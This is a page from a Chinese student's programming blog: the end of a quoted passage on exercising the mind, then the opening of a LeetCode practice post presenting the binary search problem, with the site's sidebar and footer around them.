<p>　　<strong>这是人类最明显的特质，也是万物之灵与其他动物最主要不同之处。</strong>其他的动物似乎发展到某个层次之后，便不再有心智上的发展。但是人类独有的特质，却也潜藏着巨大的危险。<strong>心智就跟肌肉一样，如果不常运用就会萎缩。</strong>心智的萎缩就是在惩罚我们不经常动脑。这是个可怕的惩罚，因为证据显示，心智萎缩也可能要人的命。除此之外，似乎也没法说明为什么许多工作忙碌的人一旦退休之后就会立刻死亡。他们活着是因为工作对他们的心智上有所要求，那是一种人为的支撑力量，也就是外界的力量。一旦外界要求的力量消失之后，他们又没有内在的心智活动，他们便停止了思考，死亡也跟着来了。</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-10T04:30:51.000Z" title="2021/7/10 下午12:30:51">2021-07-10</time>发表</span><span class="level-item"><time dateTime="2021-07-10T04:46:00.694Z" title="2021/7/10 下午12:46:00">2021-07-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></span><span class="level-item">2 分钟读完 (大约256个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%B8%80%EF%BC%89/">2021暑假leetcode训练（一）</a></h1><div class="content"><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为还在学习C++，所以本次刷题所使用的编程语言为C。下学期我们会开一门叫做《计算机算法》的专业课，我想先提前玩一玩算法，所以就通过leetcode平台去刷题了。在每道算法题解中，我会给出两种或多种解法(我的解法和其他人比较好的解法)。</p>
<h2 id="1-二分查找"><a href="#1-二分查找" class="headerlink" title="1.二分查找"></a>1.二分查找</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p>
<p>示例 1:</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">输入: nums = [-1,0,3,5,9,12], target = 9</span><br><span class="hljs-section">输出: 4</span><br><span class="hljs-section">解释: 9 出现在 nums 中并且下标为 4</span><br></code></pre></td></tr></table></figure>
<p>示例 2:</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">输入: nums = [-1,0,3,5,9,12], target = 2</span><br><span class="hljs-section">输出: -1</span><br><span class="hljs-section">解释: 2 不存在 nums 中因此返回 -1</span><br></code></pre></td></tr></table></figure>

<p>提示：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">你可以假设 <span class="hljs-selector-tag">nums</span> 中的所有元素是不重复的。<br><span class="hljs-selector-tag">n</span> 将在 <span class="hljs-selector-attr">[1, 10000]</span>之间。<br><span class="hljs-selector-tag">nums</span> 的每个元素都将在 <span class="hljs-selector-attr">[-9999, 9999]</span>之间。<br></code></pre></td></tr></table></figure>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/6/">6</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/images/you.jpg" alt="胡雅宁"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">胡雅宁</p><p class="is-size-6 is-block">虽千万人吾往矣</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">58</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">36</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1905060202" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/1905060202"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.zhihu.com/people/little-ning-ge" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">知乎</span></span><span class="level-right"><span class="level-item tag">www.zhihu.com</span></span></a></li><li><a class="level is-mobile" href="https://space.bilibili.com/24140963" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">bilibili</span></span><span class="level-right"><span class="level-item tag">space.bilibili.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="level-start"><span class="level-item">人工智能</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">数据分析</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"><span class="level-start"><span class="level-item">经验分享</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">编程语言</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"><span class="level-start"><span class="level-item">编程随想</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">脚本语言</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"><span class="level-start"><span class="level-item">计算机基础</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"><span class="level-start"><span class="level-item">闲言碎语</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"><span class="level-start"><span class="level-item">项目实战</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">17</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/BootStrap/"><span class="tag">BootStrap</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"><span class="tag">C语言中文网</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Error%E8%A7%A3%E5%86%B3/"><span class="tag">Error解决</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java-Web/"><span class="tag">Java Web</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JavaScript/"><span class="tag">JavaScript</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SpringMVC/"><span class="tag">SpringMVC</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Vue/"><span class="tag">Vue</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/leetcode/"><span class="tag">leetcode</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/programthink/"><span class="tag">programthink</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/socket/"><span class="tag">socket</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web%E5%BC%80%E5%8F%91/"><span class="tag">web开发</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B9%A0%E9%A2%98/"><span class="tag">习题</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="tag">人工智能</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E7%94%9F/"><span class="tag">人生</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BD%9C%E4%B8%9A/"><span class="tag">作业</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%9A%E5%AE%A2/"><span class="tag">博客</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tag">学习</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%A6%E7%94%9F%E5%85%9A/"><span class="tag">学生党</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"><span class="tag">小妙招</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%80%A7%E6%95%99%E8%82%B2/"><span class="tag">性教育</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"><span class="tag">操作系统</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"><span class="tag">数据库</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"><span class="tag">期末复习</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A1%86%E6%9E%B6/"><span class="tag">框架</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%88%AC%E8%99%AB/"><span class="tag">爬虫</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%99%BD%E5%AB%96/"><span class="tag">白嫖</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%AE%97%E6%B3%95/"><span class="tag">算法</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"><span class="tag">统计学习方法</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"><span class="tag">网络编程</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"><span class="tag">计算机组成原理</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><span class="tag">计算机网络</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%BA%E6%96%87/"><span class="tag">论文</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"><span class="tag">课程设计</span><span class="tag">9</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="1" data-ad-slot="1" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:21:38.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%EF%BC%9F/">如何防范黑客入侵？</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:06:02.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T16:01:33.000Z">2021-07-17</time></p><p class="title"><a href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%EF%BC%9F/">如何选择开源项目？</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T15:54:54.000Z">2021-07-16</time></p><p class="title"><a href="/2021/07/16/netcat/">netcat</a></p><p class="categories"><a href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-16T15:43:01.000Z">2021-07-16</time></p><p class="title"><a href="/2021/07/16/java%E6%96%B0%E6%89%8B%E7%9A%84%E9%80%9A%E7%97%85/">java新手的通病</a></p><p class="categories"><a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/">经验分享</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/%E6%9C%AC%E4%BA%BA.jpg" alt="胡小宁的博客" height="28"></a><p class="is-size-7"><span>&copy; 2021 胡小宁</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>